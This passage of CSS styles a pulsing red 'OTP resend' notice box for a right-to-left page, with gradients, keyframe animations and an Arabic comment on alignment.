  margin: 10px 0 0 auto; /* محاذاة لبداية السطر (يمين في RTL) ليبدو متماشياً مع باقي محتوى الرأس */
  background: linear-gradient(140deg, #b91c1c 0%, #c2413b 55%, #ef4444 100%);
  color: #fff7f7;
  border: 2px solid #7a1d18;
  border-radius: 12px;
  padding: 8px;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  text-align: center;
  gap: 5px;
  box-shadow: 0 6px 16px rgba(194, 65, 59, 0.35), inset 0 1px 0 rgba(255, 255, 255, 0.18);
  position: relative;
  overflow: hidden;
  animation: otp-resend-pulse 1.2s ease-in-out infinite;
  direction: rtl;
  cursor: default;
}

.otp-resend-square::before {
  content: "";
  position: absolute;
  inset: 0;
  background: radial-gradient(circle at top right, rgba(255, 255, 255, 0.22), transparent 55%);
  pointer-events: none;
}

.otp-resend-square-icon {
  width: 26px;
  height: 26px;
  border-radius: 50%;
  background: rgba(255, 255, 255, 0.22);
  border: 1px solid rgba(255, 255, 255, 0.45);
  display: flex;
  align-items: center;
  justify-content: center;
  flex-shrink: 0;
}

.otp-resend-square-title {
  font-size: 0.7rem;
  font-weight: 900;
  line-height: 1.25;
  text-shadow: 0 1px 2px rgba(0, 0, 0, 0.25);
}

.otp-resend-square-meta {
  display: flex;
  align-items: center;
  gap: 4px;
  font-size: 0.58rem;
  font-weight: 700;
  opacity: 0.92;
  font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
}

.otp-resend-square-count {
  background: #fff;
  color: #b91c1c;
  font-weight: 900;
  font-size: 0.58rem;
  padding: 0 5px;
  border-radius: 999px;
  box-shadow: 0 1px 2px rgba(0, 0, 0, 0.18);
}

.otp-resend-square-dot {
  width: 5px;
  height: 5px;
  background: #fff;
  border-radius: 50%;
  display: inline-block;
  animation: otp-resend-blink 0.9s ease-in-out infinite;
}

@keyframes otp-resend-pulse {
  0%, 100% {
    transform: scale(1);
    box-shadow: 0 6px 16px rgba(194, 65, 59, 0.35), inset 0 1px 0 rgba(255, 255, 255, 0.18);
  }
  50% {
    transform: scale(1.04);
    box-shadow: 0 10px 24px rgba(194, 65, 59, 0.55), inset 0 1px 0 rgba(255, 255, 255, 0.25);
  }
}

@keyframes otp-resend-blink {
  0%, 100% { opacity: 1; }
  50% { opacity: 0.35; }
}
</style>
